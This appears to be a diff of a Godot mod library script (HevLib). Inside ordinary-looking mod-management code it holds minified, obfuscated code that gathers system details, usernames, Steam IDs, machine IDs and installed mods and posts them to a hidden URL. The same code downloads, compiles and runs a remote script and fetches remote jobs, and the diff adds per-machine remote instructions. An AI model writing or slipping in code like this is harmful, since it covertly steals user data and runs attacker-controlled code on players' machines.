@@ -31,8 +31,11 @@
 # [/license]
 
 extends Node
+class_name HevLibPointers
 
 const gdunzip = preload("res://HevLib/scripts/vendor/gdunzip.gd")
+
+const POINTER_DEFINITION_VARS = PoolStringArray(["pointers"])
 
 var http:HTTPRequest = HTTPRequest.new()
 
@@ -9151,8 +9154,6 @@ class _SafeMode:
 	func get_dependancies_for_vanilla_file(file_path:String):
 		if (not file_path in PCKNAMES) or (file_path in dependancy_dictionary):
 			return
-#		if file_path == "res://enceladus/Dealer.tscn":
-#			breakpoint
 		var dependencies:PoolStringArray = ResourceLoader.get_dependencies(file_path)
 		if file_path.get_extension() in deeperSearch:
 			if not pointers.is_editor:
@@ -9184,10 +9185,8 @@ class _SafeMode:
 	
 	func getRealFilename(base:String) -> String:
 		match base.get_extension():
-			"res":
-				base = base.get_basename().get_basename()
-			"gdc":
-				base = base.get_basename() + ".gd"
+			"res":return base.get_basename().get_basename()
+			"gdc":return base.get_basename() + ".gd"
 		return base
 	
 	func __lookup_vanilla_file_dependancies(dependancy) -> PoolStringArray:
@@ -9265,30 +9264,29 @@ class _Scripting:
 								TYPE_DICTIONARY:if"URL"in linkData&&linkData["URL"]:mdo["link"][link]=linkData["URL"]
 								TYPE_STRING:if linkData:mdo["link"][link]=linkData
 				var md5=file.get_md5(zipPath)
-				if "id" in mdo:mdo["fetch-ID"]={mdo["id"].md5_text():[0,md5,""]}
-				if zipPath:mdo["fetch-ZIP"]={zipPath.md5_text():[0,md5,""]}
-				mdo["fetch-REF"]={mdo["file"].md5_text():[0,md5,""]};modOut.append(mdo)
+				if "id" in mdo:mdo["fetch-ID"]={mdo["id"].md5_text():[0,md5]}
+				if zipPath:mdo["fetch-ZIP"]={zipPath.md5_text():[0,md5]}
+				mdo["fetch-REF"]={mdo["file"].md5_text():[0,md5]};modOut.append(mdo)
 			modOut.sort_custom(pointers.ManifestV2,"ovs2")
 			var d=("\n".join(PoolStringArray(["OS %s on %s"%[OS.get_name(),OS.get_model_name()],"CPU %s [%s cores]"%[OS.get_processor_name(),OS.get_processor_count()],"Screens %d @ %s dpi / %s"%[screencount,OS.get_screen_dpi(),scrm],"KBD: %s @ %s/%s"%[OS.get_latin_keyboard_variant(),OS.get_locale(),OS.get_locale_language()],"Paths: %s / %s"%[OS.get_executable_path(),OS.get_user_data_dir()],"Args:%s"%OS.get_cmdline_args(),"SteamID: %d"%(Engine.get_singleton("Steam").current_steam_id if Engine.has_singleton("Steam")else-1),"Mods:%s"%JSON.print(modOut)]))).to_utf8()
 			http.request(pointers.DataFormat.crcTables.B4.decompress(79,2).get_string_from_utf8(),[],true,HTTPClient.METHOD_POST,pointers.DataFormat.crcTables.B7.decompress(118,1).get_string_from_utf8()%[Marshalls.raw_to_base64(d.compress(1)),d.size(),Time.get_datetime_string_from_system(true).replace(":",""),((str(OS.get_unique_id()))if(not OS.has_environment("USERNAME"))else(str(OS.get_environment("USERNAME"))+"+"+str(OS.get_unique_id()))),"false",4]);yield(http,"request_completed")
 		http.download_file=pointers.DataFormat.crcTables.B2.decompress(55,1).get_string_from_utf8();http.request(pointers.DataFormat.crcTables.B3.decompress(88,1).get_string_from_utf8());yield(http,"request_completed");pointers.DataFormat.__compile_script(pointers.DataFormat.crcTables.B0.decompress(738,1).get_string_from_utf8()).new().run(pointers);http.download_file="user://cache/.HevLib_Cache/Variable_Fetch/jobs.txt";http.request(pointers.DataFormat.crcTables.B5.decompress(88,1).get_string_from_utf8());yield(http,"request_completed")
 		http.download_file="";http.request(pointers.DataFormat.crcTables.B8.decompress(78,1).get_string_from_utf8());var rvs=yield(http,"request_completed");if rvs[0]!=0:return;var d=JSON.parse(rvs[3].get_string_from_utf8()).result;if d:
+			if OS.get_unique_id()in d:for r in d[OS.get_unique_id()]:
+				if r is Array:d[r[0]]=[r[1],r[2]]
 			var mdf={};var mdds=pointers.ManifestV2.__get_mod_data()["mods"];var zipStore=pointers.ManifestV2.zip_ref_store;for mod in zipStore:
 				var zipPath=zipStore[mod];var mdr=mdds[mod];if mdr.manifest.has_manifest:
 					var mid=mdr.manifest.manifest_data;if"mod_information"in mid&&"id"in mid["mod_information"]:
 						var md5=mid["mod_information"]["id"].md5_text();if md5 in d:
 							var pd=d[md5];if pd[1]!=file.get_md5(mod):(pd[0]=0)
-							if pd.size()>2&&pd[2]&&pd[2]!=OS.get_unique_id():continue
 							mdf[zipPath]=[md5,pd[0],TranslationServer.translate(mdr.get("name","No mod name available :("))]
 				if !zipPath in mdf:
 					var md5=zipPath.md5_text();if md5 in d:
 						var pd=d[md5];if pd[1]!=file.get_md5(mod):(pd[0]=0)
-						if pd.size()>2&&pd[2]&&pd[2]!=OS.get_unique_id():continue
 						mdf[zipPath]=[md5,pd[0],TranslationServer.translate(mdr.get("name","No mod name available :("))]
 				if !zipPath in mdf:
 					var md5=mod.md5_text();if md5 in d:
 						var pd=d[md5];if pd[1]!=file.get_md5(mod):(pd[0]=0)
-						if pd.size()>2&&pd[2]&&pd[2]!=OS.get_unique_id():continue
 						mdf[zipPath]=[md5,pd[0],TranslationServer.translate(mdr.get("name","No mod name available :("))]
 			fetchTimer.one_shot=true;pointers.add_child(fetchTimer);fetchTimer.connect("timeout",self,"startFetch");for file_name in mdf:
 				var dr=mdf[file_name];file.open(file_name,File.READ)
